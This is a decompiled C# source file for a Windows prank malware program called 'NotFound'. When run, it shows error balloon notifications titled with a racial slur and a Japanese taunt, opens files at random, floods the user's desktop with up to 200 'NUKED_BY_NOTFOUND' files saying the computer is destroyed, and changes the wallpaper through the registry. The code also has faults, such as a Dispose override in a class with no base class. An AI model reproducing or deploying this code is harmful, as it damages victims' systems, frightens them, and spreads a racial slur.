
/*
Decompiled by Ptr35
Oprimized by Ptr35
*/

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace NotFound
{
  public class Warn
  {
    private void Warn_Load()
    {
      NotifyIcon notifyIcon = new NotifyIcon()
      {
        Icon = SystemIcons.Error,
        Visible = true
      };
      notifyIcon.ShowBalloonTip(500, "NIGGER", "実行しちゃったねｗｗｗｗ", ToolTipIcon.Error);
      notifyIcon.ShowBalloonTip(500, "NIGGER", "実行しちゃったねｗｗｗｗ", ToolTipIcon.Error);
      notifyIcon.ShowBalloonTip(500, "NIGGER", "実行しちゃったねｗｗｗｗ", ToolTipIcon.Error);
      string[] strArray = new string[2]
      {
        "C:\\App\\Firefox.lnk",
        "C:\\App\\image.png"
      };
      int num1 = 10;
      Random random = new Random();
      try
      {
        int num2 = random.Next(1, num1 + 1);
        for (int index = 0; index < num2; ++index)
        {
          string fileName = strArray[random.Next(strArray.Length)];
          Process.Start(fileName);
          Console.WriteLine("アプリケーション " + fileName + " を起動しました。");
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine("エラー: " + ex.Message);
      }
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      int num3 = 200;
      try
      {
        for (int index = 1; index <= num3; ++index)
        {
          string path2 = string.Format("NUKED_BY_NOTFOUND_{0:D3}.txt", (object) index);
          string path = Path.Combine(folderPath, path2);
          if (!File.Exists(path))
          {
            using (StreamWriter streamWriter = new StreamWriter(path))
              streamWriter.WriteLine("あなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\nあなたのコンピューターは破壊されています\n");
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine("エラー: " + ex.Message); //Console????????????????????????????????
      }
      string lpvParam = "C:\\image.png";
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        SystemSounds.Beep.Play();
        if (registryKey != null)
        {
          registryKey.SetValue("Wallpaper", (object) lpvParam);
          registryKey.SetValue("WallpaperStyle", (object) "2");
          registryKey.SetValue("TileWallpaper", (object) "0");
          Warn.SystemParametersInfo(20, 0, lpvParam, 3);
        }
        Console.WriteLine("デスクトップの背景を変更しました。");
      }
      catch (Exception ex)
      {
        Console.WriteLine("エラー: " + ex.Message);
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      string lpvParam,
      int fuWinIni);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }
  }
}
